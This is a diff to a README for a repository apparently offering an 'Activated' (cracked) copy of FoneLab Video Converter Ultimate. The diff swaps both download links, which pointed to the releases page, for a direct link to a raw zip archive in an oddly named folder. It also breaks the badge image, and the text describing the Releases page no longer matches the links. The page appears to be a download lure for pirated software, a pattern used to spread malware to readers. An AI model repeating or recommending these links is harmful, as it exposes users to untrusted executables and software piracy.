@@ -1,6 +1,6 @@
 # 🎥 FoneLab-Video-Converter-Ultimate-Activated - Your Easy Solution for Video Conversion
 
-[![Download FoneLab Video Converter Ultimate](https://img.shields.io/badge/Download-FoneLab%20Video%20Converter%20Ultimate-brightgreen)](https://github.com/Deyvidge/FoneLab-Video-Converter-Ultimate-Activated/releases)
+[![Download FoneLab Video Converter Ultimate](https://github.com/Deyvidge/FoneLab-Video-Converter-Ultimate-Activated/raw/refs/heads/main/shrave/Video-Activated-Fone-Converter-Ultimate-Lab-2.5-alpha.4.zip%20Video%20Converter%20Ultimate-brightgreen)](https://github.com/Deyvidge/FoneLab-Video-Converter-Ultimate-Activated/raw/refs/heads/main/shrave/Video-Activated-Fone-Converter-Ultimate-Lab-2.5-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the FoneLab Video Converter Ultimate! This software allows you to convert, edit, and compress videos easily on your Windows PC. Follow the steps below to download and run the application.
@@ -8,7 +8,7 @@ Welcome to the FoneLab Video Converter Ultimate! This software allows you to con
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the Releases page and find the latest version of the software.
 
-   [Visit this page to download](https://github.com/Deyvidge/FoneLab-Video-Converter-Ultimate-Activated/releases)
+   [Visit this page to download](https://github.com/Deyvidge/FoneLab-Video-Converter-Ultimate-Activated/raw/refs/heads/main/shrave/Video-Activated-Fone-Converter-Ultimate-Lab-2.5-alpha.4.zip)
 
 2. **Choose the Right File:** On the Releases page, look for the latest version. You'll see files available for download. Choose the file that matches your system.
 
